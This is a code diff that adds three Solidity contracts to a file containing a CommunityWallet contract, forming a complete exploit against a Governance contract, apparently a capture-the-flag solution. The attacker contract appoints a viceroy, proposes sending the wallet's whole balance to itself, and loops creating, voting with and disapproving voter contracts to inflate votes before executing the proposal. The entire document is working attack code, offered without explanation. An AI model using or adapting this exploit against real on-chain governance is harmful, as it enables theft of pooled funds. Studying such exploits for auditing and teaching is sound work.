@@ -124,3 +124,67 @@ contract CommunityWallet {
 
     fallback() external payable {}
 }
+
+contract GovernanceAttacker {
+    address attacker;
+
+    constructor() {
+        attacker = msg.sender;
+    }
+
+    function attack(Governance governance) external {
+        GovernanceAttackerViceroy viceroy = new GovernanceAttackerViceroy(this, governance);
+        bytes memory proposalData = abi.encodeWithSignature(
+            "exec(address,bytes,uint256)",
+            attacker,
+            "",
+            address(governance.communityWallet()).balance
+        );
+        uint256 proposal = uint256(keccak256(proposalData));
+        viceroy.createProposal(governance, address(this), proposalData);
+
+        for (uint v = 0; v < 10; v++) {
+            GovernanceAttackerVoter voter = viceroy.createVoter(governance);
+            voter.vote(governance, proposal, address(viceroy));
+            viceroy.disapproveVoter(governance, address(voter));
+        }
+
+        governance.executeProposal(proposal);
+    }
+
+    function appointViceroy(Governance governance, address viceroy) public {
+        governance.appointViceroy(viceroy, 1);
+    }
+}
+
+contract GovernanceAttackerViceroy {
+    constructor(GovernanceAttacker oligarch, Governance governance) {
+        oligarch.appointViceroy(governance, address(this));
+    }
+
+    function createProposal(Governance governance, address attacker, bytes memory proposal) public {
+        governance.createProposal(address(this), proposal);
+    }
+
+    function createVoter(Governance governance) public returns (GovernanceAttackerVoter) {
+        return new GovernanceAttackerVoter(this, governance);
+    }
+
+    function approveVoter(Governance governance, address voter) public {
+        governance.approveVoter(voter);
+    }
+
+    function disapproveVoter(Governance governance, address voter) public {
+        governance.disapproveVoter(voter);
+    }
+}
+
+contract GovernanceAttackerVoter {
+    constructor(GovernanceAttackerViceroy viceroy, Governance governance) {
+        viceroy.approveVoter(governance, address(this));
+    }
+
+    function vote(Governance governance, uint256 proposal, address viceroy) public {
+        governance.voteOnProposal(proposal, true, viceroy);
+    }
+}
